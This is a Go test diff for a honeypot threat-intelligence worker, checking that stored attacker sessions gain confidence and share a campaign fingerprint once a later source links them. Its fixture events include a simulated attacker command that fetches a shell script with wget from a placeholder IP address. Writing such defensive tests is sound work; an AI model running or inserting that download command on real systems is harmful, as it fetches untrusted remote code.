@@ -2,6 +2,7 @@ package intelligence
 
 import (
 	"context"
+	"strings"
 	"sync"
 	"testing"
 	"time"
@@ -38,6 +39,77 @@ func (s *sessionDB) snapshot() (map[string]database.TTPSession, int) {
 		out[k] = v
 	}
 	return out, s.writes
+}
+
+// TestWorkerPersistsLinkedSessions: when a later source shows evidence an
+// earlier one showed, the earlier session's stored row must change too (its
+// confidence, and its campaign fingerprint when two campaigns turn out to be
+// one), although the batch holds none of its events. Session IDs never change,
+// so every write updates the row it wrote before.
+func TestWorkerPersistsLinkedSessions(t *testing.T) {
+	db := &sessionDB{}
+	loader := NewATTCKLoader(t.TempDir())
+	loader.loadEmbedded()
+	w := NewWorker(NewClassifier(loader, NewTTPBuilder(time.Hour)), db, time.Hour, 100)
+	batch := func(events ...*database.Event) map[string]database.TTPSession {
+		t.Helper()
+		db.events = events
+		w.drain(context.Background())
+		if err := w.LastError(); err != nil {
+			t.Fatal(err)
+		}
+		written, _ := db.snapshot()
+		byIP := map[string]database.TTPSession{}
+		for _, s := range written {
+			if len(s.SourceIPs) != 1 || byIP[s.SourceIPs[0]].SessionID != "" {
+				t.Fatalf("stored session %+v: want exactly one row per source", s)
+			}
+			byIP[s.SourceIPs[0]] = s
+		}
+		return byIP
+	}
+	command := func(ip, cmd string) *database.Event {
+		return &database.Event{Honeypot: "cowrie", EventType: "command", SourceIP: ip, Command: cmd, Timestamp: time.Now().UTC()}
+	}
+	payload := strings.Repeat("ab", 32)
+
+	first := batch(command("203.0.113.1", "wget http://198.51.100.9/a.sh"))["203.0.113.1"]
+	if first.Confidence != confidenceSingleSource {
+		t.Fatalf("one source alone stored with confidence %v", first.Confidence)
+	}
+	third := batch(downloadEvent("203.0.113.3", payload))["203.0.113.3"]
+	if third.CampaignFingerprint == first.CampaignFingerprint {
+		t.Fatal("unrelated sources stored in one campaign")
+	}
+
+	// The second source links the two: neither of their events is in its batch.
+	rows := batch(command("203.0.113.2", "wget http://198.51.100.9/a.sh"), downloadEvent("203.0.113.2", payload))
+	if len(rows) != 3 {
+		t.Fatalf("%d stored sessions, want one per source", len(rows))
+	}
+	for ip, was := range map[string]database.TTPSession{"203.0.113.1": first, "203.0.113.3": third} {
+		now := rows[ip]
+		if now.SessionID != was.SessionID {
+			t.Fatalf("%s: session ID changed from %q to %q", ip, was.SessionID, now.SessionID)
+		}
+		if now.CampaignFingerprint != rows["203.0.113.2"].CampaignFingerprint {
+			t.Fatalf("%s: stored campaign %s, the linking source's is %s", ip, now.CampaignFingerprint, rows["203.0.113.2"].CampaignFingerprint)
+		}
+		if now.Confidence <= was.Confidence || now.EventCount != 1 {
+			t.Fatalf("%s: stored confidence %v (was %v), %d events", ip, now.Confidence, was.Confidence, now.EventCount)
+		}
+	}
+	if rows["203.0.113.3"].CampaignFingerprint == third.CampaignFingerprint {
+		t.Fatal("the later campaign kept its own fingerprint after the two were linked")
+	}
+
+	// A restart recovers the same links from the checkpoint.
+	w = NewWorker(NewClassifier(loader, NewTTPBuilder(time.Hour)), db, time.Hour, 100)
+	rows = batch(command("203.0.113.4", "uname -a"))
+	if len(rows) != 4 || rows["203.0.113.1"].CampaignFingerprint != rows["203.0.113.3"].CampaignFingerprint ||
+		rows["203.0.113.4"].CampaignFingerprint == rows["203.0.113.1"].CampaignFingerprint {
+		t.Fatalf("after a restart: %+v", rows)
+	}
 }
 
 // TestWorkerPersistsCampaignInProgress: a TTP session was written only once it
